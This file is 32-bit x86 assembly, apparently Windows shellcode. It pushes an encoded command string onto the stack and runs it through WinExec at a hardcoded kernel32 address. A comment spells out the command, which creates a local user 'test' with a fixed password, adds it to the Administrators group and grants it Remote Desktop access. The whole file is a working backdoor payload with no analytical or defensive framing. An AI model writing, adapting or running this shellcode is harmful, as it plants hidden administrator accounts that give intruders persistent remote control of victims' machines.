[BITS 32]

global _start			

section .text
_start:

    xor edx, edx	; zero out edx
    push edx		; push null byte onto stack
    
    ;cmd.exe net user test P@ssword123 /add & net localgroup administrators test /add & net localgroup "Remote desktop users" test /add
    push 0x20202064
    push 0x64612f20
    push 0x74736574
    push 0x20227372
    push 0x65737520
    push 0x706f746b
    push 0x73656420
    push 0x65746f6d
    push 0x65522220
    push 0x70756f72
    push 0x676c6163
    push 0x6f6c2074
    push 0x656e2026
    push 0x20646461
    push 0x2f207473
    push 0x65742073
    push 0x726f7461
    push 0x72747369
    push 0x6e696d64
    push 0x61207075
    push 0x6f72676c
    push 0x61636f6c
    push 0x2074656e
    push 0x20262064
    push 0x64612f20
    push 0x33323164
    push 0x726f7773
    push 0x73405020
    push 0x74736574
    push 0x20726573
    push 0x75207465
    push 0x6e20632f
    push 0x20657865
    push 0x2e646d63

    mov ebx, esp	; save stack pointer 

    inc edx		; uCmdShow SW_SHOWNORMAL
    push edx    

    push ebx		; push pointer to add user string 
    mov edx, 0x7c8623ad	; mov address of WinExec()
    call edx
